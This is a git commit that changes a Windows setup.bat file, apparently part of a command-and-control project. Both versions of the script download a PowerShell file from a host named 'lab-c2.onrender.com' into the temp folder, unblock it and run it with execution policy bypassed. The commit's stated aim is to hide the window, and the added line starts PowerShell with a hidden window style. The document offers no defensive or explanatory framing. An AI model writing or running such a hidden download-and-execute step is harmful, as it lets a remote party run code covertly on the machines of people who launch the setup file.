88fc1b4e726076b413176aa85f03a7dc201c36f7
felixnth <felixnoethgen1@gmail.com>
2026-07-25 04:29:06 +0000

    hide window via Start-Process

--- setup.bat
+++ setup.bat
@@ -1,5 +1,4 @@
 @echo off
 set PS1=%TEMP%\winhelper.ps1
-powershell -Command "Invoke-WebRequest -Uri 'https://lab-c2.onrender.com/download' -OutFile '%PS1%' -UseBasicParsing; Unblock-File '%PS1%'"
-start /min powershell -ExecutionPolicy Bypass -NonInteractive -File "%PS1%"
+powershell -Command "Invoke-WebRequest -Uri 'https://lab-c2.onrender.com/download' -OutFile '%PS1%' -UseBasicParsing; Unblock-File '%PS1%'; Start-Process powershell -ArgumentList '-ExecutionPolicy','Bypass','-NonInteractive','-WindowStyle','Hidden','-File','%PS1%'"
 exit
